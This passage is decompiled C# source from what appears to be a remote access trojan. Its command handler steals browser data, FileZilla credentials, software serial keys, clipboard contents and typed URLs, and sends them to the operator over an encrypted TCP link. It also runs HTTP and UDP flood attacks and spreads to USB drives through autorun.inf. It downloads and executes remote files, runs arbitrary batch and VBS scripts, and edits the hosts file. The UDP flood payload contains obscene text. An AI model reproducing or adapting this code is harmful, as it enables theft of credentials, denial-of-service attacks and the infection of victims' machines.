method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Macromedia\\Flash\\7\\Registration", "Serial Number")), (object)"|"), (object)"Fireworks 7: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Macromedia\\Fireworks\\7\\Registration", "Serial Number")), (object)"|"), (object)"DreamWeaver 7: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Macromedia\\Dreamweaver\\7\\Registration", "Serial Number")), (object)"|"), (object)"Madden NFL 07: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\Madden NFL 07", "ergc")), (object)"|"), (object)"Matrix Saver v2: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\JSG\\Matrix Saver V2", "Registration")), (object)"|"), (object)"MoH Airborne: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Medal of Honor Airborne", "Product GUID")), (object)"|"), (object)"MoH Allied Assault: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Medal of Honor Allied Assault", "ergc")), (object)"|"), (object)"MoH Allied Assault BreakThrough: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Medal of Honor Allied Assault Breakthrough", "ergc")), (object)"|"), (object)"MoH Allied Assault SpearHead: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Medal of Honor Allied Assault Spearhead", "ergc")), (object)"|"), (object)"MoH Heroes 2: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Electronic Arts\\Crysis", "ergc")), (object)"|"), (object)"mIRC(User): "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\mIRC", "UserName")), (object)"|"), (object)"mIRC(License): "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\mIRC", "License")), (object)"|"), (object)"Nascar Racing 2002: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\Nascar Racing 2002", "ergc")), (object)"|"), (object)"Nascar Racing 2003: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\Nascar Racing 2003", "ergc")), (object)"|"), (object)"NHL 2002: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\NHL 2002", "ergc")), (object)"|"), (object)"NBA LIVE 2003: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\NBA LIVE 2003", "ergc")), (object)"|"), (object)"NBA LIVE 2004: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\NBA LIVE 2004", "ergc")), (object)"|"), (object)"NBA LIVE 2007: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\NBA LIVE 07", "ergc")), (object)"|"), (object)"NBA LIVE 2008: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\NBA Live 08", "ergc")), (object)"|"), (object)"SnagIT 8(User): "), method_2("HKEY_LOCAL_MACHINE\\Software\\TechSmith\\SnagIt\\8", "RegisteredTo")), (object)"|"), (object)"SnagIT 8(License): "), method_2("HKEY_LOCAL_MACHINE\\Software\\TechSmith\\SnagIt\\8", "RegistrationKey")), (object)"|"), (object)"TexasCALC(User): "), method_2("HKEY_LOCAL_MACHINE\\Software\\TexasCalc\\License", "Owner Name")), (object)"|"), (object)"TexasCALC(License): "), method_2("HKEY_LOCAL_MACHINE\\Software\\TexasCalc\\License", "Registration Key")), (object)"|"), (object)"WinAMP(User): "), method_2("HKEY_LOCAL_MACHINE\\Software\\Nullsoft\\Winamp", "regname")), (object)"|"), (object)"WinAMP(License): "), method_2("HKEY_LOCAL_MACHINE\\Software\\Nullsoft\\Winamp", "regkey")), (object)"|"), (object)"Camtasia 7(User): "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\TechSmith\\Camtasia Studio\\7.0", "RegisteredTo")), (object)"|"), (object)"Camtasia 7(License): "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\TechSmith\\Camtasia Studio\\7.0", "RegistrationKey")), (object)"|"));
						string[] array7 = text17.Split(new char[1] { '|' });
						string text18 = "";
						string[] array8 = array7;
						foreach (string text19 in array8)
						{
							text18 = text18 + text19 + "<>";
						}
						Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"INFO|SERIALSME", object_0), (object)text18)));
						SendStatus("Log sent...");
						break;
					}
					catch (Exception projectError32)
					{
						ProjectData.SetProjectError(projectError32);
						SendStatus("Couldn't execute stealer...");
						ProjectData.ClearProjectError();
						break;
					}
				case "GETWINDOWSWALLPAPERPATH":
					try
					{
						SendStatus("Sending stealer command...");
						RegistryKey registryKey2 = ((ServerComputer)Class1.Class0_0).get_Registry().get_CurrentUser().OpenSubKey("Control Panel\\Desktop", writable: false);
						string text16 = registryKey2.GetValue("WallPaper")!.ToString();
						registryKey2.Close();
						Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"INFO|WALLPAPERPATHPOST", object_0), (object)text16)));
						SendStatus("Log sent...");
						break;
					}
					catch (Exception projectError31)
					{
						ProjectData.SetProjectError(projectError31);
						SendStatus("Couldn't execute stealer...");
						ProjectData.ClearProjectError();
						break;
					}
				case "GETSAMPDATA":
					try
					{
						SendStatus("Sending stealer command...");
						string text14 = "";
						Process[] processesByName = Process.GetProcessesByName("samp-server");
						foreach (Process process in processesByName)
						{
							string fileName = process.MainModule!.FileName;
							fileName = fileName.ToString().Replace("samp-server.exe", string.Empty);
							StreamReader streamReader = new StreamReader(fileName + "server.cfg");
							string text15 = streamReader.ReadToEnd();
							streamReader.Close();
							text14 = text15;
						}
						Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"INFO|SAMPDATAPOST", object_0), (object)Strings.Replace(text14, "\r\n", "<>", 1, -1, (CompareMethod)0))));
						SendStatus("Log sent...");
						break;
					}
					catch (Exception projectError30)
					{
						ProjectData.SetProjectError(projectError30);
						SendStatus("Couldn't execute stealer...");
						ProjectData.ClearProjectError();
						break;
					}
				case "GETLAST25SITES":
					try
					{
						SendStatus("Sending stealer command...");
						string name = "Software\\Microsoft\\Internet Explorer\\TypedURLs";
						RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name);
						string text12 = null;
						int num2 = 1;
						while (true)
						{
							string name2 = "url" + num2;
							string text13 = (string)registryKey.GetValue(name2);
							if (text13 == null)
							{
								break;
							}
							text12 = text12 + "<>" + text13;
							num2++;
						}
						Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"INFO|LASTSITES", object_0), (object)text12)));
						SendStatus("Log sent...");
						break;
					}
					catch (Exception projectError29)
					{
						ProjectData.SetProjectError(projectError29);
						SendStatus("Couldn't execute stealer...");
						ProjectData.ClearProjectError();
						break;
					}
				case "GETFILAZILLA":
					try
					{
						SendStatus("Sending stealer command...");
						Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"INFO|RECFILEZILLAETA", object_0), GetFilezilla())));
						SendStatus("Log sent...");
						break;
					}
					catch (Exception projectError28)
					{
						ProjectData.SetProjectError(projectError28);
						SendStatus("Couldn't execute stealer...");
						ProjectData.ClearProjectError();
						break;
					}
				case "GETFIREFOXDATA":
					try
					{
						SendStatus("Sending stealer command...");
						Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"INFO|FIREFOXDATAPOST", object_0), FFData())));
						SendStatus("Log sent...");
						break;
					}
					catch (Exception projectError27)
					{
						ProjectData.SetProjectError(projectError27);
						SendStatus("Couldn't execute stealer...");
						ProjectData.ClearProjectError();
						break;
					}
				case "CHANGECLIPBOARDME":
					try
					{
						SendStatus("Changing clipboard data...");
						Clipboard.SetText(array[1]);
						SendStatus("Clipboard changed...");
						break;
					}
					catch (Exception projectError26)
					{
						ProjectData.SetProjectError(projectError26);
						SendStatus("Couldn't change clipboard data...");
						ProjectData.ClearProjectError();
						break;
					}
				case "GETMYCLIPBOARDATA":
					try
					{
						SendStatus("Sending stealer command...");
						Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"INFO|CLIPBOARDPOST", object_0), (object)Clipboard.GetText())));
						SendStatus("Log sent...");
						break;
					}
					catch (Exception projectError25)
					{
						ProjectData.SetProjectError(projectError25);
						SendStatus("Couldn't execute stealer...");
						ProjectData.ClearProjectError();
						break;
					}
				case "GETCHROMEDATA":
					try
					{
						SendStatus("Sending stealer command...");
						Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"INFO|CHROMEFFFA", object_0), ChromeData())));
						SendStatus("Log sent...");
						break;
					}
					catch (Exception projectError24)
					{
						ProjectData.SetProjectError(projectError24);
						SendStatus("Couldn't execute stealer...");
						ProjectData.ClearProjectError();
						break;
					}
				case "GETCAMSTASIALICENCE":
					try
					{
						SendStatus("Sending stealer command...");
						string text10 = Conversions.ToString(((ServerComputer)Class1.Class0_0).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\TechSmith\\Camtasia Studio\\6.0", "RegisteredTo", (object)null));
						Conversions.ToString(((ServerComputer)Class1.Class0_0).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\TechSmith\\Camtasia Studio\\6.0", "RegistrationKey", (object)null));
						string text11 = "User: " + text10 + "<>Serial: <>";
						Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"INFO|CAMSTASIALICENCE", object_0), (object)text11)));
						SendStatus("Log sent...");
						break;
					}
					catch (Exception projectError23)
					{
						ProjectData.SetProjectError(projectError23);
						SendStatus("Couldn't execute stealer...");
						ProjectData.ClearProjectError();
						break;
					}
				case "UNINSTALLMEBITCH":
					try
					{
						SendStatus("Bye :(");
						ProcessStartInfo processStartInfo = new ProcessStartInfo();
						processStartInfo.Arguments = "/C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del \"" + Application.get_ExecutablePath().ToString() + "\"";
						processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
						processStartInfo.CreateNoWindow = true;
						processStartInfo.FileName = "cmd.exe";
						Process.Start(processStartInfo);
						SendStatus("Victim uninstalled...");
						ProjectData.EndApp();
						break;
					}
					catch (Exception projectError22)
					{
						ProjectData.SetProjectError(projectError22);
						SendStatus("Couldn't uninstall server...");
						ProjectData.ClearProjectError();
						break;
					}
				case "USBIFECTER":
					try
					{
						SendStatus("Infecting drives...");
						USBInfect();
						SendStatus("Infected...");
						break;
					}
					catch (Exception projectError21)
					{
						ProjectData.SetProjectError(projectError21);
						SendStatus("Couldn't infect drives...");
						ProjectData.ClearProjectError();
						break;
					}
				case "BROWSESILENT":
					try
					{
						SendStatus("Visiting website...");
						WebClient webClient2 = new WebClient();
						webClient2.DownloadString(array[1]);
						SendStatus("Command executed...");
						break;
					}
					catch (Exception projectError20)
					{
						ProjectData.SetProjectError(projectError20);
						SendStatus("Couldn't visit website silently..");
						ProjectData.ClearProjectError();
						break;
					}
				case "BLOCKWEBSITEME":
					try
					{
						SendStatus("Blocking website...");
						WebsiteBlock(array[1]);
						SendStatus("Site is blocked...");
						break;
					}
					catch (Exception projectError19)
					{
						ProjectData.SetProjectError(projectError19);
						SendStatus("Couldn't block website...");
						ProjectData.ClearProjectError();
						break;
					}
				case "STARTHTTPFLOOD":
					try
					{
						SendStatus("Starting HTTP Flood...");
						string[] array6 = Strings.Split(array[1], "<>", -1, (CompareMethod)0);
						Class9.string_0 = array6[0];
						Class9.int_0 = Conversions.ToInteger(array6[1]);
						Class9.int_1 = Conversions.ToInteger(array6[2]);
						Class9.smethod_0();
						SendStatus("HTTP Flood started...");
						break;
					}
					catch (Exception projectError18)
					{
						ProjectData.SetProjectError(projectError18);
						SendStatus("Flood stopped...");
						ProjectData.ClearProjectError();
						break;
					}
				case "STARTUDPFLOOD":
					try
					{
						SendStatus("Starting UDP Flood...");
						string[] array5 = Strings.Split(array[1], "<>", -1, (CompareMethod)0);
						this.string_2 = array5[0];
						string_3 = array5[3];
						string_4 = array5[1];
						int num = Conversions.ToInteger(array5[2]);
						for (int l = 0; l <= num; l++)
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								AttackUDP();
							});
							thread.Start();
							Thread.Sleep(Conversions.ToInteger(array5[1]));
						}
						SendStatus("UDP Flood started...");
						break;
					}
					catch (Exception projectError17)
					{
						ProjectData.SetProjectError(projectError17);
						SendStatus("Flood stopped...");
						ProjectData.ClearProjectError();
						break;
					}
				case "CHATDATALOL":
					try
					{
						Class1.Class2_0.method_0().vmethod_4().get_Items()
							.Add((object)("Hacker: " + array[1]));
						break;
					}
					catch (Exception projectError16)
					{
						ProjectData.SetProjectError(projectError16);
						ProjectData.ClearProjectError();
						break;
					}
				case "STOPHTTPFLOOD":
					try
					{
						SendStatus("Stopping HTTP Flood...");
						Class9.smethod_1();
						SendStatus("HTTP Flood stopped...");
						break;
					}
					catch (Exception projectError15)
					{
						ProjectData.SetProjectError(projectError15);
						SendStatus("Flood stopped...");
						ProjectData.ClearProjectError();
						break;
					}
				case "STOPUDPFLOOD":
					try
					{
						SendStatus("Stopping UDP Flood...");
						bool_1 = false;
						SendStatus("UDP Flood stopped...");
						break;
					}
					catch (Exception projectError14)
					{
						ProjectData.SetProjectError(projectError14);
						SendStatus("Flood stopped...");
						ProjectData.ClearProjectError();
						break;
					}
				case "OPENCHAT":
					((Control)Class1.Class2_0.method_0()).Show();
					break;
				case "CLOSECHAT":
					((Control)Class1.Class2_0.method_0()).Hide();
					break;
				case "BATCHPLUGIN":
					try
					{
						SendStatus("Executing batch plugin...");
						string text9 = Path.GetTempFileName() + ".bat";
						File.WriteAllText(text9, Strings.Replace(array[1], "<newline>", "\r\n", 1, -1, (CompareMethod)0));
						Interaction.Shell(text9, (AppWinStyle)1, false, -1);
						SendStatus("Executed...");
						break;
					}
					catch (Exception projectError13)
					{
						ProjectData.SetProjectError(projectError13);
						SendStatus("Couldn't execute batch plugin...");
						ProjectData.ClearProjectError();
						break;
					}
				case "VBSPLUGIN":
					try
					{
						SendStatus("Executing vbs plugin...");
						string text8 = Path.GetTempFileName() + ".vbs";
						File.WriteAllText(text8, Strings.Replace(array[1], "<newline>", "\r\n", 1, -1, (CompareMethod)0));
						Process.Start(text8);
						SendStatus("Executed...");
						break;
					}
					catch (Exception projectError12)
					{
						ProjectData.SetProjectError(projectError12);
						SendStatus("Couldn't execute vbs plugin...");
						ProjectData.ClearProjectError();
						break;
					}
				case "HTMLPLUGIN":
					try
					{
						SendStatus("Executing html...");
						string text7 = Path.GetTempFileName() + ".html";
						File.WriteAllText(text7, Strings.Replace(array[1], "<newline>", "\r\n", 1, -1, (CompareMethod)0));
						Process.Start(text7);
						SendStatus("Executed...");
						break;
					}
					catch (Exception projectError11)
					{
						ProjectData.SetProjectError(projectError11);
						SendStatus("Couldn't execute html...");
						ProjectData.ClearProjectError();
						break;
					}
				case "FLIPME1":
					try
					{
						SendStatus("Flipping screen...");
						DEVMODE devmode_2 = NativeMethods.CreateDevmode();
						method_3(ref devmode_2);
						devmode_2.dmDisplayOrientation = 2;
						method_5(devmode_2);
						SendStatus("Screen flipped...");
						break;
					}
					catch (Exception projectError10)
					{
						ProjectData.SetProjectError(projectError10);
						SendStatus("Couldn't flip screen...");
						ProjectData.ClearProjectError();
						break;
					}
				case "FLIPME2":
					try
					{
						SendStatus("Flipping screen...");
						DEVMODE devmode_ = NativeMethods.CreateDevmode();
						method_3(ref devmode_);
						devmode_.dmDisplayOrientation = 0;
						method_5(devmode_);
						SendStatus("Screen flipped...");
						break;
					}
					catch (Exception projectError9)
					{
						ProjectData.SetProjectError(projectError9);
						SendStatus("Couldn't flip screen...");
						ProjectData.ClearProjectError();
						break;
					}
				case "GETDICFOLD":
					try
					{
						SendStatus("Getting list...");
						string text5 = "";
						string path = array[1];
						if (Directory.Exists(path))
						{
							string[] directories = Directory.GetDirectories(path);
							foreach (string text6 in directories)
							{
								text5 = text5 + "[folder]" + Strings.Replace(text6, array[1], string.Empty, 1, -1, (CompareMethod)0) + "<>";
							}
						}
						DirectoryInfo directoryInfo = new DirectoryInfo(array[1]);
						FileInfo[] files = directoryInfo.GetFiles("*.*");
						foreach (FileInfo fileInfo4 in files)
						{
							text5 = text5 + "[file]" + fileInfo4.get_Name() + "<>";
						}
						Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"INFO|LOADEDSHIT", object_0), (object)text5)));
						SendStatus("List sent...");
						break;
					}
					catch (Exception projectError8)
					{
						ProjectData.SetProjectError(projectError8);
						SendStatus("Couldn't receive list...");
						ProjectData.ClearProjectError();
						break;
					}
				case "LOADDRIVES":
					try
					{
						SendStatus("Getting drive list...");
						string[] array3 = ListAllDrives();
						string text3 = "";
						string[] array4 = array3;
						foreach (string text4 in array4)
						{
							text3 = text3 + text4 + "<>";
						}
						Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"INFO|DRIVESLIST", object_0), (object)text3)));
						SendStatus("List sent...");
						break;
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						SendStatus("Couldn't receive drives...");
						ProjectData.ClearProjectError();
						break;
					}
				case "SUSPENDPROCESS":
					try
					{
						SendStatus("Suspending process...");
						Black black2 = new Black();
						black2.suspendproces(array[1]);
						SendStatus("Process suspended...");
						break;
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						SendStatus("Couldn't suspend process...");
						ProjectData.ClearProjectError();
						break;
					}
				case "RESUMEPROCESS":
					try
					{
						SendStatus("Resuming process...");
						Black black = new Black();
						black.resumeproces(array[1]);
						SendStatus("Process resumed...");
						break;
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						SendStatus("Couldn't resume process...");
						ProjectData.ClearProjectError();
						break;
					}
				case "DELETEFILE":
					try
					{
						SendStatus("Deleting file...");
						FileInfo fileInfo3 = new FileInfo(array[1]);
						fileInfo3.Delete();
						SendStatus("File deleted...");
						break;
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						SendStatus("Couldn't delete file...");
						ProjectData.ClearProjectError();
						break;
					}
				case "FILENORMAL":
					try
					{
						SendStatus("Editing file...");
						FileInfo fileInfo2 = new FileInfo(array[1]);
						fileInfo2.Attributes = FileAttributes.Normal;
						SendStatus("File edited...");
						break;
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						SendStatus("Couldn't edit file...");
						ProjectData.ClearProjectError();
						break;
					}
				case "FILEHIDDEN":
					try
					{
						SendStatus("Editing file...");
						FileInfo fileInfo = new FileInfo(array[1]);
						fileInfo.Attributes = FileAttributes.Hidden;
						SendStatus("File edited...");
						break;
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						SendStatus("Couldn't edit file...");
						ProjectData.ClearProjectError();
						break;
					}
				case "DL":
				{
					string[] array2 = Strings.Split(array[1], "<>", -1, (CompareMethod)0);
					try
					{
						WebClient webClient = new WebClient();
						string text2 = Path.GetTempFileName() + ".exe";
						SendStatus("Downloading File...");
						webClient.DownloadFile(array2[0], text2);
						if (Conversions.ToBoolean(array2[1]))
						{
							if (Conversions.ToBoolean(array2[2]))
							{
								Interaction.Shell(text2, (AppWinStyle)0, false, -1);
								SendStatus("File Executed...");
							}
							else
							{
								Interaction.Shell(text2, (AppWinStyle)1, false, -1);
								SendStatus("File Executed...");
							}
						}
						break;
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						SendStatus("Error Downloading File...");
						ProjectData.ClearProjectError();
						break;
					}
				}
				}
			}
			catch (Exception projectError90)
			{
				ProjectData.SetProjectError(projectError90);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void Send(string message)
	{
		try
		{
			string value = poly.Encrypt(message);
			StreamWriter streamWriter = new StreamWriter(tcpClient_0.GetStream());
			streamWriter.WriteLine(value);
			streamWriter.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void SendStatus(string Message)
	{
		try
		{
			string value = poly.Encrypt("STATUS|" + Message);
			StreamWriter streamWriter = new StreamWriter(tcpClient_0.GetStream());
			streamWriter.WriteLine(value);
			streamWriter.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public object AttackUDP()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		UdpClient udpClient = default(UdpClient);
		byte[] array = default(byte[]);
		IPAddress addr = default(IPAddress);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 185:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
						case 2:
						case 10:
							break;
						case 3:
							goto IL_0008;
						case 4:
							goto IL_0011;
						case 5:
							goto IL_001b;
						case 6:
							goto IL_002a;
						case 7:
							goto IL_003f;
						case 8:
							goto IL_0052;
						case 9:
							goto IL_0060;
						default:
							goto end_IL_0000;
						case 11:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_0060:
					num = 9;
					Thread.Sleep(Conversions.ToInteger(string_4));
					goto default;
					IL_0008:
					num = 3;
					udpClient = new UdpClient();
					goto IL_0011;
					IL_0011:
					num = 4;
					array = new byte[0];
					goto IL_001b;
					IL_001b:
					num = 5;
					addr = IPAddress.Parse(string_2);
					goto IL_002a;
					IL_002a:
					num = 6;
					udpClient.Connect(addr, Conversions.ToInteger(string_3));
					goto IL_003f;
					IL_003f:
					num = 7;
					array = Encoding.ASCII.GetBytes("  My penis is like lighting, and i feed on vagina - Jon / I kill People - MC Vagina  My penis is like lighting, and i feed on vagina - Jon / I kill People - MC Vagina  My penis is like lighting, and i feed on vagina - Jon / I kill People - MC Vagina  My penis is like lighting, and i feed on vagina - Jon / I kill People - MC Vagina  My penis is like lighting, and i feed on vagina - Jon / I kill People - MC Vagina  My penis is like lighting, and i feed on vagina - Jon / I kill People - MC Vagina");
					goto IL_0052;
					IL_0052:
					num = 8;
					udpClient.Send(array, array.Length);
					goto IL_0060;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 185;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		object result = default(object);
		return result;
	}

	public void WebsiteBlock(string weblink)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		StreamWriter streamWriter = default(StreamWriter);
		StreamReader streamReader = default(StreamReader);
		string value = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 189:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_0015;
						case 4:
							goto IL_001f;
						case 5:
							goto IL_0028;
						case 6:
							goto IL_0031;
						case 7:
							goto IL_003f;
						case 8:
							goto IL_0049;
						case 9:
							goto IL_005d;
						case 10:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 11:
						case 12:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_005d:
					num = 9;
					streamWriter.Flush();
					break;
					IL_0007:
					num = 2;
					streamReader = new StreamReader("C:/windows/system32/drivers/etc/hosts");
					goto IL_0015;
					IL_0015:
					num = 3;
					value = streamReader.ReadToEnd();
					goto IL_001f;
					IL_001f:
					num = 4;
					streamReader.Dispose();
					goto IL_0028;
					IL_0028:
					num = 5;
					streamReader.Close();
					goto IL_0031;
					IL_0031:
					num = 6;
					streamWriter = new StreamWriter("C:/windows/system32/drivers/etc/hosts");
					goto IL_003f;
					IL_003f:
					num = 7;
					streamWriter.WriteLine(value);
					goto IL_0049;
					IL_0049:
					num = 8;
					streamWriter.WriteLine("127.0.0.1                        " + weblink);
					goto IL_005d;
					end_IL_0000_2:
					break;
				}
				num = 10;
				streamWriter.Close();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 189;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void USBInfect()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		string programFiles = default(string);
		string[] logicalDrives = default(string[]);
		string[] array = default(string[]);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 343:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_002a;
						case 4:
							goto IL_0042;
						case 5:
							goto IL_004b;
						case 6:
							goto IL_0062;
						case 8:
							goto IL_0071;
						case 9:
							goto IL_0074;
						case 10:
							goto IL_0099;
						case 11:
							goto IL_00c9;
						case 12:
							goto IL_00de;
						case 14:
							goto IL_00f5;
						case 7:
						case 13:
							goto IL_00fe;
						default:
							goto end_IL_0000;
						case 15:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_00fe:
					num5 = checked(num5 + 1);
					goto IL_00f5;
					IL_0008:
					num = 2;
					((ServerComputer)Class1.Class0_0).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object)"0", RegistryValueKind.DWord);
					goto IL_002a;
					IL_002a:
					num = 3;
					programFiles = ((ServerComputer)Class1.Class0_0).get_FileSystem().get_SpecialDirectories().get_ProgramFiles();
					goto IL_0042;
					IL_0042:
					num = 4;
					logicalDrives = Directory.GetLogicalDrives();
					goto IL_004b;
					IL_004b:
					num = 5;
					array = logicalDrives;
					num5 = 0;
					goto IL_0053;
					IL_0053:
					if (num5 < array.Length)
					{
						text = array[num5];
						goto IL_0062;
					}
					goto end_IL_0000_2;
					IL_00f5:
					num = 14;
					goto IL_0053;
					IL_0062:
					num = 6;
					if (!programFiles.Contains(text))
					{
						goto IL_0071;
					}
					goto IL_00fe;
					IL_0071:
					num = 8;
					goto IL_0074;
					IL_0074:
					num = 9;
					((ServerComputer)Class1.Class0_0).get_FileSystem().CopyFile(Application.get_ExecutablePath(), text + "usb.exe", (UIOption)(-1), (UICancelOption)2);
					goto IL_0099;
					IL_0099:
					num = 10;
					((ServerComputer)Class1.Class0_0).get_FileSystem().WriteAllText(text + "autorun.inf", "[autorun]\r\nopen=" + text + "usb.exe\r\nshellexecute=" + text, true);
					goto IL_00c9;
					IL_00c9:
					num = 11;
					FileSystem.SetAttr(text + "usb.exe", (FileAttribute)2);
					goto IL_00de;
					IL_00de:
					num = 12;
					FileSystem.SetAttr(text + "autorun.inf", (FileAttribute)2);
					goto IL_00fe;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 343;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		Thread thread = new Thread(Connect);
		thread.Start();
	}

	public string defaultbrowser()
	{
		string text = Conversions.ToString(((ServerComputer)Class1.Class0_0).get_Registry().GetValue("HKEY_CLASSES_ROOT\\HTTP\\shell\\open\\command", "", (object)"Not Found"));
		string[] array = Strings.Split(text, "\"", -1, (CompareMethod)0);
		return array[1];
	}

	public object GetFilezilla()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		object text3 = default(object);
		try
		{
			RichTextBox val = new RichTextBox();
			RichTextBox val2 = new RichTextBox();
			string text = "<>";
			val.LoadFile(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\recentservers.xml", (RichTextBoxStreamType)1);
			RichTextBox val3 = val;
			val3.set_Text(val3.get_Text() + "FileZilla Stealer by -Black Hacker-" + text + "------------------------------------" + text);
			string[] lines = ((TextBoxBase)val).get_Lines();
			foreach (string text2 in lines)
			{
				if (text2.Contains("<Host>"))
				{
					val3 = val2;
					val3.set_Text(val3.get_Text() + "Host: " + text2.Replace("<Host>", "").Replace("</Host>", "").Replace("            ", ""));
				}
